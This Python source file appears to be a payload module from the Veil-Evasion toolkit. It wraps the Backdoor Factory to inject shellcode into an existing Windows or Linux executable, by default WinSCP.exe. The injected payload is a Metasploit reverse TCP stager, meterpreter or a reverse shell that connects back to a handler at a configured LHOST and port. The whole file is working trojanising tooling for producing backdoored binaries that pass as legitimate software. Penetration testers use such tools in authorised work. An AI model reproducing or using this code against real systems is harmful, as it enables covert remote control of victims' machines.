"""

Automates running the Backdoor Factory on an existing .exe

More information from
        Joshua Pitts - https://github.com/secretsquirrel/the-backdoor-factory

"""

import os
import time
import shutil
from modules.common import helpers
from modules.common import shellcode
from tools.backdoor import pebin
from tools.backdoor import elfbin

# the main config file
import settings


class Payload:

    def __init__(self):
        # required options
        self.description = "Import of the BackdoorFactory."
        self.description += " Supports PE and ELF file formats."
        self.description += " Author: Joshua Pitts @midnite_runr"
        self.language = "native"
        self.rating = "Normal"
        self.extension = ""
        self.type = ""
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "ORIGINAL_EXE" : ["WinSCP.exe", "PE or ELF executable to run through the Backdoor Factory"],
                                    "PAYLOAD"      : ["reverse_tcp_stager_threaded", "PE or ELF: meter_tcp, rev_shell, custom | PE only meter_https"],
                                    "LHOST"        : ["127.0.0.1", "IP of the Metasploit handler"],
                                    "LPORT"        : ["4444", "Port of the Metasploit handler"],
                                    "PATCH_METHOD" : ["Automatic", "Either Manual or Automatic. For use with payloads that have *_threaded in the name"]
                                 }

    def basicDiscovery(self):
        try:
            testBinary = open(self.required_options["ORIGINAL_EXE"][0], 'rb')
        except:
            self.type = ""
            return
        header = testBinary.read(8)
        testBinary.close()
        if 'MZ' in header:
            self.type = 'PE'
        elif 'ELF' in header:
            self.type = 'ELF'
        else:
            raise IOError
            print "\nBDF only supports intel 32/64bit PE and ELF binaries\n"
            raw_input("\n[>] Press any key to return to the main menu.")
            self.type = ""

    def generate(self):
        #Because of calling BDF via classes, absolute paths change
        if self.required_options["ORIGINAL_EXE"][0] == "WinSCP.exe":
            self.required_options["ORIGINAL_EXE"][0] = settings.VEIL_EVASION_PATH + "testbins/WinSCP.exe"

        if not os.path.isfile(self.required_options["ORIGINAL_EXE"][0]):
            print "\nError during Backdoor Factory execution:\nInput file does not exist"
            raw_input("\n[>] Press any key to return to the main menu.")
            return ""

        #Make sure the bin is supported
        self.basicDiscovery()

        shellcodeChoice = self.required_options['PAYLOAD'][0]

        if shellcodeChoice == "custom":

            Shellcode = self.shellcode.generate(self.required_options)

            raw = Shellcode.decode("string_escape")
            with open(settings.TEMP_DIR + "shellcode.raw", 'wb') as f:
                f.write(raw)

            print "shellcode", settings.TEMP_DIR + "shellcode.raw"
            #invoke the class for the associated binary
            if self.type == 'PE':
                targetFile = pebin.pebin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe',
                                        SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw",
                                        PATCH_METHOD=self.required_options["PATCH_METHOD"][0])

                self.extension = "exe"

            elif self.type == 'ELF':
                targetFile = elfbin.elfbin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe',
                                            SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
                self.extension = ""
            else:
                print "\nInvalid File or File Type Submitted, try again.\n"
                return ""

        else:

            # invoke the class for the associated binary
            if self.type == 'PE':
                targetFile = pebin.pebin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe',
                                         SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0],
                                         PORT=int(self.required_options["LPORT"][0]),
                                         PATCH_METHOD=self.required_options["PATCH_METHOD"][0])
                self.extension = "exe"
            elif self.type == 'ELF':
                targetFile = elfbin.elfbin(FILE=self.required_options["ORIGINAL_EXE"][0],
                                           OUTPUT='payload.exe', SHELL=shellcodeChoice,
                                           HOST=self.required_options["LHOST"][0],
                                           PORT=int(self.required_options["LPORT"][0]))
                self.extension = ""
            else:
                print "\nInvalid File or File Type Submitted, try again.\n"
                return ""

        print helpers.color("\n[*] Running The Backdoor Factory...")

        #PATCH STUFF
        try:
            targetFile.run_this()
        except:
            #I use sys.exits in BDF, so not to leave Veil
            print "\nBackdoorFactory Error, check options and binary\n"
            raw_input("\n[>] Press any key to return to the main menu.")
            return ""
        #Because speed
        time.sleep(3)

        try:
            # read in the output .exe from /tmp/
            with open(settings.VEIL_EVASION_PATH + "backdoored/payload.exe", 'rb') as f:
                PayloadCode = f.read()

        except IOError:
            print "\nError during The Backdoor Factory execution\n"
            raw_input("\n[>] Press any key to return to the main menu.")
            return ""

        try:
            #remove backdoored/ in VEIL root
            shutil.rmtree(settings.VEIL_EVASION_PATH + 'backdoored')

        except:
            #quiet failure
            pass

        return PayloadCode
